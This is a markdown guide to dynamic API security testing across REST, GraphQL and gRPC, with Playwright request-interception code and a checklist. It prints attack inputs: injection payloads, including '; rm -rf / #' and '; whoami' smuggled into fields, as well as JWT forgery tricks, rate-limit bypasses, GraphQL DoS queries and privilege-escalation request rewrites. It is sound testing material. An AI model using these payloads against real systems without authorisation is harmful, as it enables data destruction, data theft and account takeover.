# API Security Testing for DAST

## REST API Testing

### Endpoint Discovery

```markdown
Common API Patterns:
- /api/v1/users
- /api/v2/products
- /rest/user
- /services/api/data

Discovery Methods:
1. Monitor network requests with Playwright
2. Parse JavaScript for API endpoints
3. Check common paths
4. Analyze responses for API structure
```

### Authentication Testing

```markdown
## API Key Security

Tests:
- API key in URL: /api/data?api_key=SECRET (logged/cached)
- API key in header: Authorization: Bearer SECRET (better)
- API key rotation capability
- API key scope/permissions

## OAuth 2.0 Testing

Tests:
- Token in URL vs header
- Token expiration
- Refresh token security
- Scope validation
- PKCE for public clients

## JWT Testing

Vulnerabilities:
- None algorithm: {"alg":"none"}
- Weak signing key: Brute force HS256
- Key confusion: RS256 → HS256
- Expired token accepted
- Missing signature verification

Tools:
- jwt_tool: python3 jwt_tool.py TOKEN
```

### Authorization Testing

```markdown
## BOLA (Broken Object Level Authorization)

Test:
1. Login as User A, get token
2. Access: GET /api/user/A_ID/profile (works)
3. Access: GET /api/user/B_ID/profile (should fail)

If B's data returned = BOLA vulnerability

## BFLA (Broken Function Level Authorization)

Test admin endpoints with regular user token:
- GET /api/admin/users
- POST /api/admin/delete-user
- PUT /api/admin/settings

If accessible = BFLA vulnerability
```

### Input Validation

```markdown
## Mass Assignment

Payload:
POST /api/users
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "role": "admin",  // Should not be settable
  "isVerified": true,  // Bypass email verification
  "credits": 99999  // Manipulate balance
}

## Injection in API

SQL Injection:
GET /api/users?id=1' OR '1'='1'--

NoSQL Injection:
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}

Command Injection:
POST /api/backup
{"filename": "; rm -rf / #"}
```

### Rate Limiting

```markdown
## Bypass Techniques

Header Manipulation:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 1.2.3.4
X-Client-IP: 5.6.7.8

Multiple Sessions:
- Create new session per request
- Use multiple API keys
- Rotate user agents

Distributed:
- Use multiple IPs
- Cloud functions
- Proxy rotation
```

## GraphQL Testing

### Introspection

```graphql
# Full schema discovery
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# If introspection disabled, use field suggestions:
query {
  nonExistentField
}
# Error reveals: "Did you mean 'users'?"
```

### Authorization Bypass

```graphql
# Test all fields for sensitive data
query {
  users {
    id
    email  # Should be accessible
    password  # Should NOT be accessible
    ssn  # Should NOT be accessible
  }
}

# IDOR via GraphQL
query {
  user(id: "victim_id") {
    email
    creditCard
  }
}
```

### Batching Attacks

```graphql
# Extract massive data in single request
query {
  user1: user(id: 1) { email password }
  user2: user(id: 2) { email password }
  user3: user(id: 3) { email password }
  # ... repeat 1000 times
  user1000: user(id: 1000) { email password }
}

# Bypasses rate limiting
# Single HTTP request, massive data extraction
```

### DoS Attacks

```graphql
# Query depth DoS
query {
  posts {
    author {
      posts {
        author {
          posts {
            # Deeply nested, high load
          }
        }
      }
    }
  }
}

# Alias-based DoS
query {
  a1: currentUser { posts { title } }
  a2: currentUser { posts { title } }
  # ... repeat 10000 times
  a10000: currentUser { posts { title } }
}
```

### Mutations Testing

```graphql
# Missing authorization
mutation {
  deleteUser(id: "admin") {
    success
  }
}

mutation {
  updateUserRole(userId: "attacker", role: "admin") {
    success
  }
}

# Injection
mutation {
  createPost(title: "Test'; DROP TABLE posts;--") {
    id
  }
}
```

## gRPC Testing

### Service Enumeration

```bash
# Using grpcurl
grpcurl -plaintext target.com:50051 list

# List methods
grpcurl -plaintext target.com:50051 list package.ServiceName

# Describe method
grpcurl -plaintext target.com:50051 describe package.ServiceName.MethodName
```

### Authorization Testing

```bash
# Test without authentication
grpcurl -plaintext \
  -d '{"user_id": "victim"}' \
  target.com:50051 package.Service/GetUserData

# Test with manipulated metadata
grpcurl -plaintext \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"user_id": "admin"}' \
  target.com:50051 package.UserService/GetProfile
```

### Injection Testing

```bash
# Protobuf injection
grpcurl -plaintext -d '{
  "user_id": "1",
  "command": "; whoami"
}' target.com:50051 package.Service/ExecuteCommand
```

## API Testing Checklist

### Authentication
- [ ] API key security
- [ ] OAuth 2.0 implementation
- [ ] JWT vulnerabilities
- [ ] Token expiration
- [ ] Session management

### Authorization
- [ ] BOLA (IDOR) on all endpoints
- [ ] BFLA on admin endpoints
- [ ] Function-level access control
- [ ] Scope validation

### Input Validation
- [ ] SQL injection
- [ ] NoSQL injection
- [ ] Command injection
- [ ] XSS in API responses
- [ ] Mass assignment
- [ ] Type confusion

### Rate Limiting
- [ ] Rate limiting present
- [ ] Bypass attempts
- [ ] DDoS protection

### Data Exposure
- [ ] Excessive data returned
- [ ] Sensitive data in responses
- [ ] Error messages verbose
- [ ] Stack traces exposed

### GraphQL Specific
- [ ] Introspection disabled
- [ ] Query depth limiting
- [ ] Query complexity limiting
- [ ] Field authorization
- [ ] Batching protection

## Playwright MCP API Testing Patterns

### Monitor API Calls

```javascript
// Track all API requests
const apiCalls = []

page.on('request', request => {
  if (request.url().includes('/api/')) {
    apiCalls.push({
      url: request.url(),
      method: request.method(),
      headers: request.headers(),
      postData: request.postData()
    })
  }
})

// Interact with application
await page.goto(targetUrl)
await page.click('.load-data')

// Test collected APIs
for (const api of apiCalls) {
  // Test for IDOR, injection, etc.
}
```

### Modify API Requests

```javascript
// Intercept and modify API requests
await page.route('/api/**', route => {
  const request = route.request()
  const postData = JSON.parse(request.postData())

  // Attempt privilege escalation
  postData.role = 'admin'
  postData.user_id = 'victim_id'

  route.continue({
    postData: JSON.stringify(postData)
  })
})

// Trigger API call
await page.click('#submit')
```

### Test GraphQL

```javascript
// Send GraphQL introspection query
const introspection = await page.evaluate(async () => {
  const response = await fetch('/graphql', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      query: `{
        __schema {
          types { name fields { name } }
        }
      }`
    })
  })
  return response.json()
})

// Test discovered queries
```

## API Security Best Practices

### Testing Strategy
1. Discover all API endpoints
2. Understand API structure and authentication
3. Test authentication/authorization thoroughly
4. Test input validation on all parameters
5. Check rate limiting and DoS protection
6. Verify proper error handling
7. Test for sensitive data exposure

### Tools Integration
```bash
# Nuclei for API CVEs
nuclei -l api_endpoints.txt -t nuclei-templates/cves/ -t nuclei-templates/exposures/apis/

# Custom testing with Playwright
python3 scripts/api_security_tester.py --swagger swagger.json --output api_results.json
```

This completes the API security testing guide for DAST.
